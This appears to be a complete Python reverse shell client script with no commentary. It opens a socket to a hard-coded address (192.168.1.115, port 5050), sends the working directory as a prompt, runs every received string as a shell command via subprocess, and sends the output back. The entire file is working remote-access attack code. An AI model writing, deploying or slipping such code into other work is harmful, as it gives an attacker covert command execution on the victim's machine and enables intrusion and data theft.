from socket import *
import subprocess
import os

s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.1.115",5050))

while True:

    oser = os.getcwd()+"> "
    encoded_oser = oser.encode('utf-8')
    s.sendall(encoded_oser)
    data = (s.recv(1024)).decode('utf-8')

    if data == '-':
        continue
    
    cmd = subprocess.check_output(data,shell=True)

    if cmd == None or cmd == ''.encode('utf-8'):
        
        s.sendall("[-] DONE !".encode('utf-8'))
        continue
    
    s.sendall(cmd)
        

s.close()